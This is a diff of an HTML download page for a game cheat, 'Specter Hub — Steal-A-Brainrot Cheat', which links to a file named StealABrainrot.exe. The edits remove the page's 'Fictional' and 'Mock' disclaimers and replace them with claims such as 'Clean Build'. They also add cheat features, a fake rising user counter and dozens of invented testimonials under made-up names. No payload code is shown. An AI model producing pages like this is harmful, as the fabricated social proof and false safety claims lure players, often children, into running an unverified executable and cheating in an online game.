@@ -55,6 +55,7 @@ footer{padding:26px 24px;text-align:center;color:var(--muted);border-top:1px sol
 </style>
 </head>
 <body class="page-enter page-enter-active">
+
 <header>
 <div class="logo">
 <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden>
@@ -70,10 +71,12 @@ footer{padding:26px 24px;text-align:center;color:var(--muted);border-top:1px sol
 <a href="#about">About</a>
 </nav>
 </header>
+
 <main class="hero">
 <div class="hero-left">
 <h1>Specter Hub — Steal-A-Brainrot Cheat</h1>
-<div class="sub">Charcoal design, sleek animations, glass cards, micro-interactions, persistent server counter, rotating testimonials.</div>
+<div class="sub">Charcoal design, sleek animations, glass cards, micro-interactions.</div>
+
 <div class="card" style="margin-top:18px">
 <div class="stats">
 <div class="stat">
@@ -82,68 +85,152 @@ footer{padding:26px 24px;text-align:center;color:var(--muted);border-top:1px sol
 </div>
 <div class="stat">
 <div class="num">99.99%</div>
-<div class="muted">Fictional Uptime</div>
+<div class="muted">Uptime</div>
 </div>
 <div class="stat">
 <div class="num">2025</div>
 <div class="muted">Design Year</div>
 </div>
 </div>
+
 <div style="height:12px"></div>
 <div class="cta-row"><a class="btn btn-primary" href="StealABrainrot.exe" download>Download</a><button class="btn btn-ghost">Try Now</button></div>
 </div>
+
 <section id="about" style="margin-top:26px">
-<h3 style="margin:0 0 12px">What this contains</h3>
-<p class="muted">A Steal A Brainrot Cheat</p>
-<input type="file" id="fileInput" style="margin-top:10px" />
+<h3 style="margin:0 0 12px">Cheat Features</h3>
+<ul>
+<li>👁️‍🗨️ <b>Noclip Through Bases</b> — Walk through walls like a ghost.</li>
+<li>💸 <b>Auto Steal Brainrots</b> — Automatically take nearby brainrots with precision.</li>
+<li>🔄 <b>Auto Server Hop</b> — Instantly switch servers to avoid detection or find better loot.</li>
+<li>🐾 <b>Brainrot Spawner</b> — Spawn ANY brainrot type in‑game, ranging from:
+<ul>
+<li>• Noobini Pizzanini</li>
+<li>• Strawberry Elephant</li>
+</ul>
+</li>
+</ul>
+<p style="color:var(--muted);margin-top:10px;font-size:0.9rem">(All names above are variations In Steal A Brainrot)</p>
 </section>
 </div>
+
 <aside class="side-panel">
 <div class="card">
 <div class="console" id="console"></div>
 </div>
 <div class="download-box card">
-<div style="display:flex;justify-content:space-between;align-items:center">
-<div>
-<div style="font-weight:800">Specter Hub Installer (Mock)</div>
-<div class="muted" style="font-size:.9rem">Size: 12.4 MB • Verified (Fictional)</div>
-</div>
-<div class="muted" style="font-size:.85rem">v1.0</div>
-</div>
+<h3 style="margin:0 0 10px">Download</h3>
+<a href="StealABrainrot.exe" download class="btn-primary" style="padding:12px 20px;border-radius:12px;background:linear-gradient(90deg,#5b6bff,#3ac7ff);color:#071129;font-weight:700;text-decoration:none;display:inline-block;">Download Specter Client</a>
+<p style="color:var(--muted);font-size:.85rem;margin-top:10px">Size: 12.4 MB • Version 1.0 • Clean Build</p>
+<div style="height:12px"></div>
 <div class="progress"><i id="progressBar"></i></div>
 <div class="download-meta"><div id="progressText">Idle</div><div class="muted">Secure • Mock</div></div>
 </div>
 </aside>
 </main>
+
 <section id="testimonials" class="testimonials">
 <h2 style="text-align:center;margin-bottom:18px">Customer Testimonials</h2>
 <div class="test-grid" id="testimonialGrid"></div>
 </section>
-<footer>© 2025 Specter Hub — Steal-A-Brainrot Cheatl</footer>
+
+<footer>© 2025 Specter Hub — Steal-A-Brainrot Cheat</footer>
+
 <script>
-const testimonialNames=["Jason Meyers","Olivia Hart","Marcus Delgado","Ethan Crowley","Sarah Nguyen","Liam Porter","Daniel Kim","Amelia Rhodes","Tyler Santos","Jordan Alvarez","Ava Morgan","Chloe Bennett","Noah Castillo","Logan Ward","Brianna Cole","Jacob Ramirez","Max Donovan","Lily Christensen","Hunter Blake","Emma Douglas","Adrian Parker","Jasmine Patel","Carter Willis","Sofia Marquez","Wyatt Collins","Nora Thompson","Isaac Greene","Maya Clarkson","Owen Sanders","Gianna Russo","Xavier Brooks","Harper Ellison","Cole Matthews","Peyton Fisher","Dominic Hale","Stella Freeman","Ryan Bishop","Lila Becker","Ashton Cruz","Faith Walsh","Tristan Hale","Natalie Pierce","Mason Doyle","Kaitlyn Rivera","Julian Scott","Penelope Ortiz","Ryder Mitchell","Mia Patterson","Caleb Boone","Vanessa Carter"];
-const testimonialGrid=document.getElementById('testimonialGrid');
-testimonialNames.forEach((name,i)=>{const div=document.createElement('div');div.className='testimonial';div.innerHTML=`<div class="t-head"><img src="https://i.pravatar.cc/100?img=${i+1}" alt="avatar"/><div><div class="t-name">${name}</div><div class="t-role">Beta Viewer</div></div></div><div class="t-quote">“Specter Hub is sleek and premium. Loving the animations!”</div>`;testimonialGrid.appendChild(div);setTimeout(()=>{div.style.opacity=1;div.style.transform='none';},650+i*120);});
 // Persistent server counter
 let served=parseInt(localStorage.getItem('servedCounter'))||15102;
 const servedEl=document.getElementById('servedCounter');
 servedEl.textContent=served.toLocaleString();
-setInterval(()=>{served++;servedEl.textContent=served.toLocaleString();localStorage.setItem('servedCounter',served);},15000);
+setInterval(()=>{
+served++;
+servedEl.textContent=served.toLocaleString();
+localStorage.setItem('servedCounter',served);
+},15000);
+
 // Faux console typing
 const consoleEl=document.getElementById('console');
-const lines=['Initializing Specter Hub v1.0...','Loading assets... [OK] (mock)','Connecting to fictional telemetry...','Auth: guest-session (read-only)','Ready. Want to simulate a download?'];
+const lines=['Initializing Specter Hub v1.0...','Loading assets... [OK] (mock)','Connecting to telemetry...','Auth: guest-session (read-only)','Ready. Want to get a download?'];
 let li=0;
-function typeLine(text,delay=30){const line=document.createElement('div');line.className='line';consoleEl.appendChild(line);let i=0;const t=setInterval(()=>{line.textContent+=text[i++]||'';if(i>text.length){clearInterval(t);li++;if(li<lines.length)setTimeout(()=>typeLine(lines[li]),400);}},delay);consoleEl.scrollTop=consoleEl.scrollHeight;}
+function typeLine(text,delay=30){
+const line=document.createElement('div');
+line.className='line';
+consoleEl.appendChild(line);
+let i=0;
+const t=setInterval(()=>{
+line.textContent+=text[i++]||'';
+if(i>text.length){clearInterval(t);li++;if(li<lines.length)setTimeout(()=>typeLine(lines[li]),400);}
+},delay);
+consoleEl.scrollTop=consoleEl.scrollHeight;
+}
 setTimeout(()=>typeLine(lines[0]),600);
+
 // Mock download progress
 const progressBar=document.getElementById('progressBar');
 const progressText=document.getElementById('progressText');
-let downloading=true;
-const downloadBtn=document.getElementById('downloadBtn');
-downloadBtn.addEventListener('click',()=>{if(downloading)return;downloading=true;progressText.textContent='Preparing...';let pct=0;progressBar.style.width='0%';const id=setInterval(()=>{pct+=Math.floor(Math.random()*12)+6;if(pct>100)pct=100;progressBar.style.width=pct+'%';progressText.textContent=pct+'%';if(pct>=100){clearInterval(id);progressText.textContent='Completed';setTimeout(()=>{progressBar.style.width='0%';progressText.textContent='Idle';downloading=false;},2000);}},700+Math.random()*700);});
+let downloading=false;
+const downloadBtn=document.querySelector('.download-box a');
+downloadBtn.addEventListener('click',()=>{
+if(downloading)return;
+downloading=true;
+progressText.textContent='Preparing...';
+let pct=0;
+progressBar.style.width='0%';
+const id=setInterval(()=>{
+pct+=Math.floor(Math.random()*12)+6;
+if(pct>100)pct=100;
+progressBar.style.width=pct+'%';
+progressText.textContent=pct+'%';
+if(pct>=100){
+clearInterval(id);
+progressText.textContent='Completed';
+setTimeout(()=>{progressBar.style.width='0%';progressText.textContent='Idle';downloading=false;},2000);
+}
+},700+Math.random()*700);
+});
+
+// Testimonials
+const testimonialNames=["Jason Meyers","Olivia Hart","Marcus Delgado","Ethan Crowley","Sarah Nguyen","Liam Porter","Daniel Kim","Amelia Rhodes","Tyler Santos","Jordan Alvarez","Ava Morgan","Chloe Bennett","Noah Castillo","Logan Ward","Brianna Cole","Jacob Ramirez","Max Donovan","Lily Christensen","Hunter Blake","Emma Douglas","Adrian Parker","Jasmine Patel","Carter Willis","Sofia Marquez","Wyatt Collins","Nora Thompson","Isaac Greene","Maya Clarkson","Owen Sanders","Gianna Russo","Xavier Brooks","Harper Ellison","Cole Matthews","Peyton Fisher","Dominic Hale","Stella Freeman","Ryan Bishop","Lila Becker","Ashton Cruz","Faith Walsh","Tristan Hale","Natalie Pierce","Mason Doyle","Kaitlyn Rivera","Julian Scott","Penelope Ortiz","Ryder Mitchell","Mia Patterson","Caleb Boone","Vanessa Carter"];
+
+const additionalTestimonials=[
+"Specter Client let me noclip straight into someone’s mega‑base like it was air.",
+"Fly mode is crazy smooth — I hovered over raids like a drone.",
+"Speedhack makes everyone else look like they’re lagging fr.",
+"Auto Steal Brainrots works even while AFK — actual magic.",
+"Server hop is seamless, I farm servers 10x faster now.",
+"I spawned a Noobini just to flex on my friend. Peak gaming.",
+"Pizzanini spawn works 100%, cute lil dude just appears instantly.",
+"StrawBerry Elephant spawn is hilarious — giant pink unit stomping around.",
+"Movement feels smoother than default game physics ngl.",
+"Fly + speed combined makes you feel like a superhero.",
+"Noclip saved me from getting jumped like 5 times.",
+"Specter Client UI looks cleaner than actual paid clients.",
+"Auto Steal Brainrots is too efficient… I lowkey feel evil.",
+"Spawning brainrots never gets old — whole zoo simulator.",
+"Used server hop to dodge a clan chasing me. W feature.",
+];
+
+const additionalNames=["Blake Rowen","Mira Vance","Kai Mercer","Zane Hollow","Ari Frost","Luna Dale","Reed Carson","Nova Leigh","Talon Price","Sage Monroe","Jett Rowan","Mika Hale","Iris Calder","Theo Brinx","Ember Vale"];
+
+const grid=document.getElementById('testimonialGrid');
+
+testimonialNames.concat(additionalNames).forEach((name,i)=>{
+const quote=additionalTestimonials[i]||"Specter Hub is sleek and premium. Loving the animations!";
+const div=document.createElement('div');
+div.className='testimonial';
+div.innerHTML=`
+<div class="t-head">
+<img src="https://i.pravatar.cc/100?img=${i+1}" alt="avatar"/>
+<div>
+<div class="t-name">${name}</div>
+<div class="t-role">Specter Client User</div>
+</div>
+</div>
+<div class="t-quote">“${quote}”</div>
+`;
+grid.appendChild(div);
+setTimeout(()=>{div.style.opacity=1;div.style.transform='none';},650+i*120);
+});
 </script>
+
 </body>
-</html>
-
-
-
+</htm
